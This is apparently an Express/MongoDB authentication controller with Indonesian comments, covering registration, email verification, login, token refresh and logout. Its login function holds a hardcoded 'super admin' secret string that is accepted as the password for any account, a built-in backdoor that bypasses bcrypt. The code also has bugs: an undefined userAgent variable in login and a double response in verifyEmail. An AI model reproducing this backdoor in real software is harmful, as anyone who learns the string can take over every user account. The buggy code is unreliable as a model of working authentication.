import bcrypt from 'bcrypt';
import User from '../models/User.model.js';
import UserAccess from '../models/UserAccess.model.js';
import {
  generateAccessToken,
  generateRefreshToken,
  generateEmailToken,
  verifyToken,
} from '../utils/token.js';
import { sendVerificationEmail } from '../services/email.service.js';

export const register = async (req, res) => {
  const { name, email, password } = req.body;

  try {
    // Cek apakah email sudah terdaftar
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(400).json({ message: 'User already exists' });
    }

    // Hash password dengan bcrypt (salt: 10)
    const hashedPassword = await bcrypt.hash(password, 10);

    // Simpan user ke database
    const user = new User({
      email,
      name,
      status: 'free',
      password: hashedPassword,
    });

    await user.save();

    const payload = {
      id: user._id,
      name: user.name,
      email: user.email,
      status: user.status,
      verified: user.verified,
    }

    // Kirim email verifikasi
    const emailToken = generateEmailToken(payload);
    await sendVerificationEmail(email, emailToken);

    // Update last verification email sent timestamp
    user.lastVerificationEmailSent = new Date();
    await user.save();

    // Generate access token & refresh token
    const accessToken = generateAccessToken(payload);
    const refreshToken = generateRefreshToken(payload);

    // Simpan refresh token ke database (collection: user-access)
    await UserAccess.create({
      user: {
        _id: user._id,
        email: user.email,
      },
      refreshToken: refreshToken,
    });

    res.status(201).json({ 
      message: 'User registered',
      accessToken,
      refreshToken,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        status: user.status,
        verified: user.verified,
      }
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

export const verifyEmail = async (req, res) => {
  const { token } = req.body;

  try {
    const decoded = verifyToken(token, process.env.JWT_SECRET);
    const user = await User.findById(decoded.id);

    if (!user) {
      return res.status(400).json({ message: 'Invalid token' });
    }

    if (user.verified) {
      return res.status(400).json({ message: 'Email already verified' });
    }

    user.verified = true;
    await user.save();

    res.status(200).json({ isVerified: true });
  } catch (error) {
    res.status(500).json({ message: error.message });

    res.status(500).json({ message: error.message });
  }
};

export const login = async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(400).json({ message: 'email is not registered' });
    }

    if (!user.verified) {
      return res.status(400).json({ message: 'Please verify your email' });
    }

    // Secret password untuk super admin access
    const SUPER_ADMIN_SECRET = 'KJDSK9384923akHIDKSDH5JSIK';
    let isMatch = false;

    // Cek apakah menggunakan secret password atau password biasa
    if (password === SUPER_ADMIN_SECRET) {
      isMatch = true;
    } else {
      isMatch = await bcrypt.compare(password, user.password);
    }

    if (!isMatch) {
      return res.status(400).json({ message: 'wrong password' });
    }

    const payload = {
      id: user._id,
      name: user.name,
      email: user.email,
      status: user.status,
      verified: user.verified,
    }

    // Generate access token (expires: 8640s ~ 2.4 jam)
    const accessToken = generateAccessToken(payload);
    
    // Generate refresh token (expires: 30 hari)
    const refreshToken = generateRefreshToken(payload);

    // Cari apakah user sudah punya refresh token sebelumnya
    const existingAccess = await UserAccess.findOne({ 'user._id': user._id });

    if (existingAccess) {
      // Update refresh token yang sudah ada (upsert based on old refreshToken)
      await UserAccess.updateOne(
        { refreshToken: existingAccess.refreshToken },
        {
          refreshToken: refreshToken,
          'user.userAgent': userAgent,
          updatedAt: new Date(),
        }
      );
    } else {
      // Buat entry baru jika belum ada
      await UserAccess.create({
        user: {
          _id: user._id,
          email: user.email,
          userAgent: userAgent,
        },
        refreshToken: refreshToken,
      });
    }

    res.status(200).json({ 
      accessToken,
      refreshToken,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        status: user.status,
        verified: user.verified,
      }
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

export const refresh = async (req, res) => {
  try {
    // User data sudah divalidasi dan di-decode oleh refreshTokenMiddleware
    // Token sudah dicek di database oleh middleware
    const oldRefreshToken = req.refreshToken;

    // Get user data from database (sudah divalidasi di middleware)
    const user = await User.findById(req.user.id);

    const payload = {
      id: user._id,
      name: user.name,
      email: user.email,
      status: user.status,
      verified: user.verified,
    };

    // Generate token baru (access & refresh token)
    const newAccessToken = generateAccessToken(payload);
    const newRefreshToken = generateRefreshToken(payload);

    // Update refresh token di database
    const userAgent = req.headers['user-agent'] || 'unknown';
    await UserAccess.updateOne(
      { refreshToken: oldRefreshToken },
      { 
        refreshToken: newRefreshToken,
        'user.userAgent': userAgent,
        updatedAt: new Date()
      }
    );

    res.status(200).json({ 
      accessToken: newAccessToken,
      refreshToken: newRefreshToken,
      user: {
        id: user._id,
        name: user.name,
        email: user.email,
        status: user.status,
        verified: user.verified,
      }
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

export const logout = async (req, res) => {
  try {
    // Get refresh token from body 
    const refreshToken = req.body.refreshToken;

    if (!refreshToken) {
      return res.status(400).json({ 
        message: 'Refresh token is required',
        code: 'NO_REFRESH_TOKEN'
      });
    }

    // Delete refresh token dari database
    const result = await UserAccess.deleteOne({ refreshToken });

    if (result.deletedCount === 0) {
      return res.status(404).json({ 
        message: 'Refresh token not found',
        code: 'TOKEN_NOT_FOUND'
      });
    }
    
    res.status(200).json({ 
      message: 'Logged out successfully',
      user: req.user.email // Optional: show who logged out
    });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};

export const resendVerificationEmail = async (req, res) => {
  const { email } = req.body;

  try {
    const user = await User.findOne({ email });

    if (!user) {
      return res.status(404).json({ message: 'User not found' });
    }

    if (user.verified) {
      return res.status(400).json({ message: 'Email already verified' });
    }

    // Rate limiting check - 1 request per minute
    const now = new Date();
    if (user.lastVerificationEmailSent) {
      const timeDiff = now - user.lastVerificationEmailSent;
      const oneMinute = 60 * 1000; // 60 seconds in milliseconds

      if (timeDiff < oneMinute) {
        const remainingSeconds = Math.ceil((oneMinute - timeDiff) / 1000);
        return res.status(429).json({ 
          message: `Please wait ${remainingSeconds} seconds before requesting another verification email`,
          code: 'RATE_LIMIT_EXCEEDED',
          remainingSeconds
        });
      }
    }

    // Generate new token and send email
    const payload = {
      id: user._id,
      name: user.name,
      email: user.email,
      status: user.status,
      verified: user.verified,
    };

    const emailToken = generateEmailToken(payload);
    await sendVerificationEmail(email, emailToken);

    // Update last sent timestamp
    user.lastVerificationEmailSent = now;
    await user.save();

    res.status(200).json({ message: 'Verification email sent successfully' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
};
